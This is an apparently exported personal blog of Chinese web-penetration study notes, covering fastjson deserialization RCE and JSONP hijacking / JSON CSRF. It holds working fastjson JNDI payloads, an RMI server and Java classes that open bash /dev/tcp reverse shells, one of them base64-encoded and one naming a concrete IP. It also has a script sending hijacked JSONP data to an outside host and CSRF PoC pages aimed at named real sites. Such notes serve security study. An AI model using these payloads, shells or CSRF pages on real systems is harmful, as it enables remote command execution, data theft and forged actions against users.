{"meta":{"title":"吾善养浩然气","subtitle":null,"description":"纯净水@流云-自留地","author":"blackj liuyun","url":"http://yoursite.com"},"pages":[{"title":"About Me","date":"2018-12-28T10:24:42.000Z","updated":"2019-07-21T04:17:41.254Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"给小破邮丢人的Web汪，一直在路上"},{"title":"categories","date":"2018-09-22T17:42:49.000Z","updated":"2019-07-21T04:30:49.079Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"说明常规渗透XXEXSS业务逻辑ceshi内网渗透内网穿透内网测试信息收集测试1111111111211123区块链安全"},{"title":"tags","date":"2018-09-22T18:05:33.000Z","updated":"2019-07-21T04:30:48.883Z","comments":true,"path":"tags/index-1.html","permalink":"http://yoursite.com/tags/index-1.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-22T18:03:46.000Z","updated":"2019-07-21T04:30:48.766Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"title: 区块链安全date: 2018-09-23 02:03:46 type: “tags”"}],"posts":[{"title":"","slug":"Web渗透/漏洞学习/fastjson","date":"2019-07-25T10:04:37.673Z","updated":"2019-07-25T10:04:37.673Z","comments":true,"path":"2019/07/25/Web渗透/漏洞学习/fastjson/","link":"","permalink":"http://yoursite.com/2019/07/25/Web渗透/漏洞学习/fastjson/","excerpt":"","text":"fastjson title: fastjson 1.2.47 rce date: 2019-07-18 22:00:00 categories: - web 渗透 - 漏洞学习 - fastjson tags: - web 渗透 - 漏洞学习 - fastjson fastjson 1.2.47 rce在渗透测试中 发现了fastjson的有漏洞的版本， 想着尝试下 危害恶意攻击者可以构造攻击请求绕过FastJSON的黑名单策略。例如，攻击者通过精心构造的请求，远程让服务端执行指定命令 对应payload1234567891011&#123; &quot;name&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;x&quot;: &#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://ip:port/Exploit&quot;, &quot;autoCommit&quot;: true &#125;&#125; 此处简单测试了利用该命令漏洞会去请求exploit。这个漏洞的利用方式跟18年的fastjson反序列化漏洞比较类似，这里先看下18年的fastjson漏洞，跟着分析下 FastJson-JdbcRowSetImpl搭建漏洞环境根据FastJson-JdbcRowSetImpl搭建该漏洞环境，进行测试, 该漏洞环境 开启http服务1Python3 -m http.server 80 生成Payload1java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar &lt;HTTP服务地址&gt; 指定RMI端口 触发 poc 如下 12345678910111213141516171819202122import java.lang.Runtime;import java.lang.Process;public class CommandObject &#123; public CommandObject()&#123; try&#123; Runtime rt = Runtime.getRuntime(); //Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;); //String[] commands = &#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;; String[] commands = &#123;&quot;ping&quot;,&quot;xxxx.ceye.io&quot;&#125;; Process pc = rt.exec(commands); System.out.println(&quot;11111&quot;); pc.waitFor(); &#125;catch(Exception e)&#123; e.printStackTrace(); System.out.println(&quot;2222&quot;); &#125; &#125; public static void main(String[] argv)&#123; CommandObject e = new CommandObject(); &#125;&#125; 反弹shell 测试1String[] commands = &#123;&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;&#125;; 将此处直接修改为该命令，发现结果不行，直接运行该commandobject程序结果发现是zsh 不支持，切换个,网上一堆用如下java反弹shell的写法，结果发现在1.8的jdk，一直不符合格式1String[] commands = [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]; 修改后如下,可以反弹shell，还有其他方式暂时未试，详情看使用java反弹shell12345678910111213141516171819import java.lang.Runtime;import java.lang.Process;public class fastjson &#123; public fastjson()&#123; try&#123; Runtime rt = Runtime.getRuntime(); //String[] commands = &#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;; //String[] commands = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;&apos;/bin/bash -i &gt;&amp; /dev/tcp/118.24.146.204/8550 0&gt;&amp;1&apos;&quot;&#125;; Process pc = rt.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;); //System.out.println(commands[0]); pc.waitFor(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; fastjson e = new fastjson(); &#125;&#125; 漏洞分析根据分析，这次遇到的fastjson漏洞不是最近1.2.47版本的，而是之前1.2.24此处反编译的FastJson_JdbcRowSetImpl_JNDI_RMIServer如下创建rmi（java 本身的rpc框架） 12345678910111213141516171819202122232425262728293031323334353637383940import cn.com.topsec.fastjson.FastJson_JdbcRowSetImpl_JNDI_RMIServer;import com.sun.jndi.rmi.registry.ReferenceWrapper;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.NamingException;import javax.naming.Reference;public class FastJson_JdbcRowSetImpl_JNDI_RMIServer&#123; public static void start(String httpServer, int rmiPort, String hostName) throws AlreadyBoundException, RemoteException, NamingException &#123; System.out.println(&quot;* Open JNDI-RMI Listener on &quot; + rmiPort); System.out.println(&quot;\\n [*] HTTPSERVER = &quot; + httpServer); System.out.println(&quot; [*] RMIPORT = &quot; + rmiPort);System.setProperty(&quot;java.rmi.server.hostname&quot;, hostName); Registry registry = LocateRegistry.createRegistry(rmiPort); Reference reference = new Reference(&quot;CommandObject&quot;, &quot;CommandObject&quot;, httpServer); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(&quot;Object&quot;, referenceWrapper); &#125; public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123; String httpServer = args[0]; int rmiPort = Integer.parseInt(args[1]); String[] httpServerHost = httpServer.split(&quot;:&quot;); String hostName = httpServerHost[0]; httpServer = &quot;http://&quot; + httpServer + &quot;/&quot;; start(httpServer, rmiPort, hostName); System.out.println(&quot;\\n [*] Payload���&quot;); System.out.println(&quot; [+] &#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://&quot; + httpServerHost[0] + &quot;:&quot; + rmiPort + &quot;/Object\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&quot;); System.out.println(&quot;\\n [*] enjoy���&quot;); &#125;&#125; 创建RMI Server1234567891011121314151617181920212223package com.luckyqiao.rmi;import java.io.IOException;import java.rmi.AlreadyBoundException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.UnicastRemoteObject;public class RMIServer &#123; public static void main(String[] args) &#123; RemoteHello remoteHello = new RemoteHelloImpl(); try &#123; RemoteHello stub = (RemoteHello) UnicastRemoteObject.exportObject(remoteHello, 4000); //导出服务，使用4000端口 Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 8000); //获取Registry registry.bind(&quot;hello&quot;, stub); //使用名字hello，将服务注册到Registry &#125; catch (AlreadyBoundException | IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 参照sky 的rmi server 进行修改如下123456789101112131415161718import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;/** * @author sky */public class rmiserver &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(&quot;CommandObject&quot;, &quot;CommandObject&quot;,&quot;http://localhost:80/&quot;); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(&quot;Exploit&quot;,referenceWrapper); &#125;&#125; 整理下 利用方式【1】首先准备一个 RMI Server【2】开启对应的httpserver【3】CommandObject.class 执行文件【4】利用poc 1.2.47 与1.2.24的区别在该漏洞情况下 poc与1.2.47 稍有区别1.2.24 poc如下1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:389/obj&quot;,&quot;autoCommit&quot;:true&#125; 根据poc来看 是进行了黑名单的绕过，在1.2.24的漏洞情况下，将”com.sun.rowset.JdbcRowSetImpl”进行了黑名单的处理，但在1.2.47中又给绕过了 1234567891011&#123; &quot;name&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;x&quot;: &#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://ip:port/Exploit&quot;, &quot;autoCommit&quot;: true &#125;&#125; 绕过分析-待续fastjson黑名单在1.2.48的补丁中将 “java.lang.Class”给进行拉黑处理了 参考fastjson-blacklistFastJson-JdbcRowSetImpl使用java反弹shellfastjson =&lt; 1.2.47 反序列化漏洞浅析","categories":[],"tags":[]},{"title":"json与jsonp的学习与分析","slug":"安全策略/json","date":"2019-07-21T04:44:08.733Z","updated":"2019-07-21T04:44:08.852Z","comments":true,"path":"2019/07/21/安全策略/json/","link":"","permalink":"http://yoursite.com/2019/07/21/安全策略/json/","excerpt":"","text":"[TOC] json与jsonp的学习与分析json和jsonp的区别避免在后续的工作中把json和jsonp搞混，这里说明下其区别 json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求 json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。12345678910&lt;script&gt;function test(data)&#123; //alert(v.name); var xmlhttp = new XMLHttpRequest(); var url = &quot;http://xx.xx.xx.xx/&quot; + JSON.stringify(data); xmlhttp.open(&quot;GET&quot;,url,true); xmlhttp.send(); &#125;&lt;/script&gt;&lt;script src=&quot;http://xx.xx.xx.xx/1.php?callback=test&quot;&gt;&lt;/script&gt; jsonp 简介json padding 将json数据填充进回调函数；在客户端创建一个回调函数并将回调函数名传给服务端，服务端根据定义的回调函数名的方法，将获取的json数据传入方法，完成回调。 jsonp 风险jsonp劫持利用条件 只使用csrf-token进行csrf校验 获取csrf token这类跨域问题，CORS、PostMessage以及jsonp，这里我们先讨论jsonp的情况，在遇到这类时，可以先尝试检查是否存在泄漏token的jsonp。 利用方式 测试方法，在get url中添加jsonp常用回调函数（可以根据具体的情况判断），常用函数名的变量名如下：1callback、jsonpcallback、func 通过jsonp获取到后端身份校验token，构造CSRF页面 嵌入获取到的token值，进行后段绕过校验CSRF攻击。利用示例：12345678910111213141516171819202122232425&lt;html&gt;&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&quot; method=&quot;POST&quot; id=&quot;csrfsend&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;bid&quot; value=&quot;9947&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;tid&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;这是测试结果&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;这是测试标题&quot;&gt;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; name=&quot;_csrf_token&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;anonymous&quot; value=&quot;1&quot;&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt;function hehehe(obj)&#123; console.log(obj); var csrf_token = obj[&quot;result&quot;][&quot;data&quot;][&quot;_csrf_token&quot;]; document.getElementById(&quot;token&quot;).value = csrf_token; document.getElementById(&quot;csrfsend&quot;).submit();&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&amp;callback=hehehe&amp;bid=9947&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 防范措施 referer限制（注意referer过滤是否正则可绕过如http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer） 随机token callback可自定义导致的安全问题 典型案例Content-Type与XSS漏洞利用条件 输出json时，没有严格定义Content-Type（Content-Type: application/json） callback 输出点没有进行过滤处理 利用方式防范 严格定义Content-Type: application/json Content-Type校验不严漏洞 在python Bottle中出现过这个问题，对应的cve编号CVE-2014-3137，在该漏洞中Bottle框架会接受诸如“text / plain; application / json”作为json内容 application/json类型，攻击者可能会使用它来绕过安全机制，例如，Chrome不允许将内容类型设置为“application / json”的跨源xmlhttprequests，但在bottel中可以将其设置为“text / plain; application / json”绕过。 绕过形式 Content-Type防御解析HTML的事件，例如在IE6、7等版本请求的URL文件后加一个/x.html就可以解析1http://127.0.0.1/getUsers.php/x.html?callback=＜script＞alert(/xss/)＜/script＞ 过滤callback以及JSON数据输出注意 旧版ie中的utf7-BOM导致的问题 MHTML与JSONPMHTML（MIME HTML协议）协议解析跨域漏洞，这个有点老，先不管 FLASH与JSONP这个也是早年的漏洞问题了，这里要稍微注意下content-type与jsonp的关系，执行jsonp的状态下1234Content-Type = &apos;application/json;charset=UTF-8&apos; Content-Type = &apos;text/json;charset=UTF-8&apos; Content-Type = &apos;text/javascript;charset=UTF-8&apos; Content-Type =&apos;application/javascript;charset=UTF-8&apos; 严格来说json格式也属于js对象的子集，严格的JavaScript对象表示法来表示结构化的数据，所以使用content-type为javascript时，服务端也认可客户端提交的json格式数据。 FLASH的调用及域 html调用flash，flash可以改后缀名(swf改成gif等)。 flash可以单独访问，但是其效果类似与html调用同域的flash，但只这个后缀必须是swf。 flash发动请求时，是根据flash的域来判断的，而不是html来判断： flash请求同域资源时，直接忽视crossdomain.xml。 flash（跨域传输数据）请求外域资源时，受外域下crossdomain.xml里的策略限制。 在CSRF的防御策略上，一般是通过referer以及token校验，但在借用flash上传的时候，可以绕过CSRF的referer和token限制。在只有referer校验的CSRF，就可以直接用 上传flash利用，在有token校验的时候，就要劫持token，在用到jsonp，就可以用jsonp劫持token，进一步利用 利用思路利用思路如下： 将flash文件上传到存在上传处的目标网站中 用户触发该flash中的csrf代码，由于flash请求同源资源时，直接忽视crossdomain.xml,flash发送的请求的Referer是flash的因此referer校验无效，在存在jsonp劫持的条件下，可以获取用户token，这个时候token校验值也无效了。通过flash上传+jsonp劫持绕过referer校验和token校验达到CSRF。 利用验证在利用这个jsonp之前，先来了解一下swf-json-csrf 利用环境 支持旧版本flash浏览器GET以及POST请求可用： chrome 61.0及以前 firefox 52.0.1及以前 Opera 47.0及以前 Safari 11.0及以前 开启referer验证+token验证 利用JSONP进行水坑攻击这个是乌云里面一篇较早的文章了，水坑攻击者在有漏洞的网站上部署上可触发获取别的网站有用信息的js，如：攻击者在A网站上插入了可执行的js，建立水坑；js利用callback获取第三方网站B上的对应用户信息；将获取的信息解析发送给攻击者自己的接收平台。 JSON风险目标是 利用FLASH利用JSON跨站点请求伪造 JSON格式的CSRF当数据内容提交为json格式的报文时，CSRF和常规的CSRF就不一样了，即便这个CSRF没有校验referer和token，这个时候post的数据用form形式提交，将json内容放在name属性中，这个时候会有一个value值，当这个value值为空的时候，数值会有一个”=”，正常情况下服务端json解析器在校验的时候可能会拒绝这个请求（不符合格式）。 随意在burp里面翻了个包来测试 效果如下： 123456789101112POST /get_flags_async HTTP/1.1Host: experiment.appadhoc.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Referer: https://blog.csdn.net/Content-Type: application/json;charset=UTF-8Content-Length: 551Origin: https://blog.csdn.netConnection: close&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125; 借用burp生成的csrf的POC，将json内容置为name，value置为空12345678910&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt; &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;&#123;&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 请求内容如下：123456789101112POST /get_flags_async HTTP/1.1Host: experiment.appadhoc.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Referer: http://burp/Content-Type: text/plainContent-Length: 554Connection: closeUpgrade-Insecure-Requests: 1&#123;&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;= 返回结果：json解析器并不解析，并且Content-Type为也由原本的application/json转换为text/plain类型 1234567891011HTTP/1.1 400 Bad RequestServer: nginx/1.12.2Date: Fri, 22 Feb 2019 07:52:08 GMTContent-Type: text/plain; charset=UTF-8Content-Length: 77Connection: closeAccess-Control-Allow-Origin: *The request content was malformed:unknown token =Near: e&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;= 服务器查找json格式的数据但不验证Content-type对于服务器查找json格式的数据但不验证Content-type的情况，可以尝试以下方法(使用Content-type：text / plain来实现)： 方法一 fetch api的调用 1234567891011121314&lt;html&gt;&lt;title&gt;JSON CSRF POC&lt;/title&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt; JSON CSRF POC &lt;/h1&gt;&lt;script&gt;fetch(&apos;http://vul-app.com&apos;, &#123;method: &apos;POST&apos;, credentials: &apos;include&apos;, headers: &#123;&apos;Content-Type&apos;: &apos;text/plain&apos;&#125;, body: &apos;&#123;&quot;name&quot;:&quot;attacker&quot;,&quot;email&quot;:&quot;attacker.com&quot;&#125;&apos;&#125;);&lt;/script&gt;&lt;form action=&quot;#&quot;&gt;&lt;input type=&quot;button&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 方法二 hackerone 上的方法 1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;$( document ).ready(function() &#123; $(&quot;#z&quot;).attr(&quot;name&quot;,&apos;&#123;&quot;entity&quot;:&quot;https://zzz.com&quot;,&quot;type&quot;:&quot;domain&quot;,&quot;time&quot;:&quot;&apos;+($.now()/1000)+&apos;&quot;,&quot;project&quot;:&quot;&lt;&lt;LAST_PROJECT&gt;&gt;&quot;,&quot;is_debugging&quot;:false,&quot;plugin&quot;:&quot;chrome-wakatime/1.0.2&quot;,&quot;fakeparam&quot;:&quot;&apos;); $(&quot;#f&quot;).submit();&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form id=&quot;f&quot; ENCTYPE=&quot;text/plain&quot; action=&quot;https://api.wakatime.com/api/v1/users/current/heartbeats&quot; method=&quot;post&quot;&gt;&lt;input id=&quot;z&quot; type=&quot;hidden&quot; name=&apos;test&apos; value=&apos;test&quot;&#125;&apos;&gt; &lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 给value赋予一个值，构造正常的json数据包形式一：用单引号构造123456789101112131415161718192021222324&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt; &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;input name=&apos;&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://blog.csdn.net/&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;,&quot;test&quot;:&quot;&apos; value=&apos;test&quot;&#125;&apos; type=&apos;hidden&apos;&gt; &lt;input type=submit&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;请求数据：POST /get_flags_async HTTP/1.1Host: experiment.appadhoc.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: text/plainContent-Length: 124Connection: closeUpgrade-Insecure-Requests: 1&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;,&quot;test&quot;:&quot;=test&quot;&#125; 返回200 服务器查找json格式的数据并验证Content-type，即application/json但在校验Content-type的情况下，这个时候上述方法就行不不通了。这个时候可以用ajax来自定义数据头，XHRHTTPREQUEST修改Content-Type,改成application/json12345678910111213141516171819&lt;html&gt; &lt;body&gt; &lt;script&gt; function submitRequest() &#123; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;http://www.xxx.com/webnet/edit&quot;, true); xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;); xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;); xhr.withCredentials = true; xhr.send(JSON.stringify(&#123;&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;&#125;)); &#125; &lt;/script&gt; &lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 但是这个有个缺陷，使用xmlhttprequest的时候，会先发一个OPTIONS请求预检(非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求,即浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错)，在使用XHR的时候空域状态下会有跨域限制。这里涉及到cors跨域限制的问题，详情可以看看‘https://my.oschina.net/hccake/blog/886602&#39; 预检请求：123456789OPTIONS /get_flags_async HTTP/1.1Host: experiment.appadhoc.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Access-Control-Request-Method: POSTAccess-Control-Request-Headers: content-typeOrigin: nullConnection: close 其中如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。报错：1Access to XMLHttpRequest at &apos;https://experiment.appadhoc.com/get_flags_async&apos; from origin &apos;null&apos; has been blocked by CORS policy: Response to preflight request doesn&apos;t pass access control check: The value of the &apos;Access-Control-Allow-Origin&apos; header in the response must not be the wildcard &apos;*&apos; when the request&apos;s credentials mode is &apos;include&apos;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute. 服务器设置允许任意域名跨域请求与可携带cookie进行了冲突，这个问题是后端配置的问题（axios默认是发送请求的时候不会带上cookie的，需要通过设置withCredentials: 